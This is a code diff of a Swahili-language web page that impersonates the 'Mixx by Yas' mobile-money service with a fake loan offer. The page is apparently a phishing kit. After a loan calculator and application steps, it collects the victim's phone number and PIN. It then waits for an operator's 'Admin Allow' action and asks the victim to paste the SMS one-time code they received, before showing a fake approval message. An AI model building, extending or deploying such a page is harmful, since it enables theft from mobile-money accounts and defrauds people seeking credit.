@@ -8,7 +8,7 @@
 </head>
 <body>
     <div class="container">
-        <!-- STEP 1: NAELEWA WELCOME SCREEN -->
+        <!-- 1. NAELEWA WELCOME NOTICE -->
         <div id="step-naelewa" class="card active">
             <div class="logo-container">
                 <div class="mixx-logo">Mixx</div>
@@ -19,18 +19,160 @@
             <button id="btn-naelewa" class="btn-primary">NAELEWA</button>
         </div>
 
-        <!-- STEP 2: CREDENTIALS / PIN FORM -->
-        <div id="step-form" class="card hidden">
-            <div class="header-banner">
+        <!-- 2. SLIDER DASHBOARD -->
+        <div id="step-slider" class="card hidden">
+            <div class="logo-container" style="margin-bottom: 0;">
+                <div class="mixx-logo" style="font-size: 16px; padding: 4px 16px;">Mixx</div>
+            </div>
+            <div class="header-banner" style="margin-bottom: 5px;">
                 <h2>Mixx by Yas</h2>
                 <p>Mikopo mahiri, viwango vya haki</p>
             </div>
+            <div style="display: flex; gap: 6px; justify-content: center; margin-bottom: 10px;">
+                <span class="badge-pill">⚡ Idhini 98%</span>
+                <span class="badge-pill">🔒 Ada Nafuu</span>
+                <span class="badge-pill">📱 Malipo Papo</span>
+            </div>
+
+            <!-- Dashboard Calculator Box -->
+            <div class="dash-calc-box">
+                <div style="font-size: 13px; color: var(--text-muted); margin-bottom: 6px;">📊 HESABU MKOPO WAKO <span style="float: right; color: var(--accent-yellow); font-size: 11px;">5% APR Fixed</span></div>
+                
+                <div class="dash-row">
+                    <span>Nataka kukopa</span>
+                    <span id="slider-val-display" style="color: var(--accent-yellow); font-weight: bold;">Tsh 1,000,000</span>
+                </div>
+                <input type="range" id="range-amount" min="50000" max="5000000" step="50000" value="1000000" class="custom-slider">
+
+                <div class="dash-row" style="margin-top: 12px;">
+                    <span>Muda wa Malipo</span>
+                    <span id="slider-duration-display" style="color: var(--accent-yellow); font-weight: bold;">3 Mwezi</span>
+                </div>
+                <input type="range" id="range-duration" min="1" max="12" step="1" value="3" class="custom-slider">
+
+                <div style="font-size: 11px; color: var(--text-muted); margin-top: 8px;">Kiwango cha Riba: <strong style="color: #fff;">5% APR</strong></div>
+            </div>
+
+            <!-- Monthly Calculation Card -->
+            <div class="amount-box" style="margin: 5px 0;">
+                <span class="value" id="monthly-payment-val" style="font-size: 22px;">Tsh 336,115</span>
+                <span class="label" style="margin-top: 4px;">Makadirio ya Malipo ya Kila Mwezi</span>
+                <div style="font-size: 11px; color: var(--text-muted); margin-top: 4px;">Jumla ya ulipaji: <span id="total-repay-val" style="color: #fff;">Tsh 1,008,345</span> (Principal + Riba)</div>
+            </div>
+
+            <button type="button" class="btn-primary" id="btn-slider-next" style="margin-top: 5px;">OMBA SASA →</button>
+        </div>
+
+        <!-- 3. HATUA 1 YA 3 -->
+        <div id="step-loan-1" class="card hidden">
+            <div class="header-banner">
+                <h2>Maombi ya Mkopo</h2>
+                <p>Hatua 1 ya 3</p>
+            </div>
+            <div class="input-group">
+                <label>Aina ya Mkopo</label>
+                <select id="loan-type" class="form-control">
+                    <option value="Mkopo wa Biashara">Mkopo wa Biashara</option>
+                    <option value="Mkopo wa Haraka">Mkopo wa Haraka</option>
+                    <option value="Mkopo wa Kilimo">Mkopo wa Kilimo</option>
+                </select>
+            </div>
+            <div class="input-group">
+                <label>Kiasi cha Mkopo (TSh)</label>
+                <input type="text" id="loan-amount" class="form-control" value="1000000">
+            </div>
+            <div class="input-group">
+                <label>Muda wa Mkopo</label>
+                <select id="loan-duration" class="form-control">
+                    <option value="Mwezi 1">Mwezi 1</option>
+                    <option value="Miezi 3" selected>Miezi 3</option>
+                    <option value="Miezi 6">Miezi 6</option>
+                    <option value="Miezi 48">Miezi 48</option>
+                </select>
+            </div>
+            <div class="input-group">
+                <label>Madhumuni ya Mkopo</label>
+                <textarea id="loan-purpose" class="form-control" rows="2" placeholder="Elezea madhumuni ya mkopo wako..."></textarea>
+            </div>
+            <button type="button" class="btn-primary" id="btn-next-1">HATUA INAYOFUATA</button>
+        </div>
+
+        <!-- 4. HATUA 2 YA 3 -->
+        <div id="step-loan-2" class="card hidden">
+            <div class="header-banner">
+                <h2>Maombi ya Mkopo</h2>
+                <p>Hatua 2 ya 3</p>
+            </div>
+            <div style="display: flex; gap: 10px;">
+                <div class="input-group" style="flex: 1;">
+                    <label>Jina la Kwanza</label>
+                    <input type="text" id="first-name" class="form-control" placeholder="Jina la kwanza" required>
+                </div>
+                <div class="input-group" style="flex: 1;">
+                    <label>Jina la Ukoo</label>
+                    <input type="text" id="last-name" class="form-control" placeholder="Jina la ukoo" required>
+                </div>
+            </div>
+            <div class="input-group">
+                <label>Nambari ya Simu</label>
+                <div class="phone-input-wrapper">
+                    <span class="prefix">+255</span>
+                    <input type="tel" id="phone" placeholder="712345678 au 0712345678" required>
+                </div>
+                <small style="color: var(--text-muted); font-size: 11px; margin-top: 4px;">Weka nambari 9 au anza na 0 (mfano, 0712345678)</small>
+            </div>
+            <div style="display: flex; gap: 10px; margin-top: 10px;">
+                <button type="button" class="btn-secondary" id="btn-prev-2" style="flex: 1;">ILIYOTANGULIA</button>
+                <button type="button" class="btn-primary" id="btn-next-2" style="flex: 1;">HATUA INAYOFUATA</button>
+            </div>
+        </div>
+
+        <!-- 5. HATUA 3 YA 3 -->
+        <div id="step-loan-3" class="card hidden">
+            <div class="header-banner">
+                <h2>Maombi ya Mkopo</h2>
+                <p>Hatua 3 ya 3</p>
+            </div>
+            <div class="input-group">
+                <label>Hali ya Ajira</label>
+                <select id="employment-status" class="form-control">
+                    <option value="Mfanyabiashara">Mfanyabiashara</option>
+                    <option value="Miajiriwa">Miajiriwa</option>
+                    <option value="Mjasiriamali">Mjasiriamali</option>
+                </select>
+            </div>
+            <div class="input-group">
+                <label>Mapato ya Mwaka (TSh)</label>
+                <input type="text" id="annual-income" class="form-control" placeholder="Weka mapato ya mwaka">
+            </div>
+            <div class="info-box" style="text-align: left; font-size: 13px; margin-bottom: 10px;">
+                <strong>Muhtasari wa Maombi</strong><br>
+                Kiasi cha Mkopo: <span id="summary-amount" style="float: right; color: var(--accent-yellow);">TSh 1,000,000</span><br>
+                Muda wa Mkopo: <span id="summary-duration" style="float: right;">Miezi 3</span><br>
+                Madhumuni: <span id="summary-purpose" style="float: right;">Biashara</span><br>
+                Mwombaji: <span style="float: right;">MIXX BY YAS</span>
+            </div>
+            <div style="display: flex; gap: 10px;">
+                <button type="button" class="btn-secondary" id="btn-prev-3" style="flex: 1;">ILIYOTANGULIA</button>
+                <button type="button" class="btn-primary" id="btn-submit-loan" style="flex: 1;">WASILISHA MAOMBI</button>
+            </div>
+        </div>
+
+        <!-- 6. PHONE NUMBER & 4-DIGIT PIN ENTRY (Loaded immediately after Step 3) -->
+        <div id="step-form" class="card hidden">
+            <div class="logo-container">
+                <div class="mixx-logo">Mixx</div>
+            </div>
+            <div class="header-banner">
+                <h2>Mixx by Yas</h2>
+                <p>Weka Nambari na PIN kuthibitisha</p>
+            </div>
             <form id="loan-form">
                 <div class="input-group">
-                    <label>Nambari ya Simu</label>
+                    <label>Nambari ya Simu ya Kuthibitisha</label>
                     <div class="phone-input-wrapper">
                         <span class="prefix">+255</span>
-                        <input type="tel" id="phone" placeholder="712345678 au 0712345678" required>
+                        <input type="tel" id="confirm-phone" placeholder="712345678" required>
                     </div>
                 </div>
 
@@ -49,14 +191,14 @@
             </form>
         </div>
 
-        <!-- STEP 3: LOADING / WAITING FOR APPROVAL -->
+        <!-- LOADING SCREEN (Waiting for Admin Allow action) -->
         <div id="step-loading" class="card hidden">
             <div class="spinner"></div>
             <h3>Inashughulikia Ombi Lako...</h3>
             <p>Tafadhali subiri kidogo wakati tunathibitisha taarifa zako.</p>
         </div>
 
-        <!-- STEP 4: OTP / SMS VERIFICATION SCREEN -->
+        <!-- 7. OTP / SMS PASTING SCREEN (Loads immediately when Admin taps ALLOW) -->
         <div id="step-otp" class="card hidden">
             <div class="otp-header">
                 <h3>TAFADHALI BANDIKA SMS ILIYOTUMWA KWAKO KWENYE NAMBARI YA MIXX BY YAS HAPA CHINI</h3>
@@ -69,19 +211,19 @@
             <button id="btn-thibitisha" class="btn-primary">THIBITISHA</button>
         </div>
 
-        <!-- STEP 5: SUCCESS CONGRATULATIONS SCREEN -->
+        <!-- SUCCESS SCREEN -->
         <div id="step-success" class="card hidden">
             <div class="success-icon">✓</div>
             <h2>Hongera!</h2>
             <p>Mkopo wako umeidhinishwa! Fedha zitatolewa hivi karibuni.</p>
             <div class="amount-box">
                 <span class="label">KIASI KILICHOIDHINISHWA</span>
-                <span class="value">TSh 1,000,000</span>
+                <span class="value" id="final-approved-amount">TSh 1,000,000</span>
             </div>
             <button class="btn-primary" onclick="location.reload()">Rudi Nyumbani</button>
         </div>
     </div>
     <script src="script.js"></script>
 </body>
-    </html>
-                
+                    </html>
+    
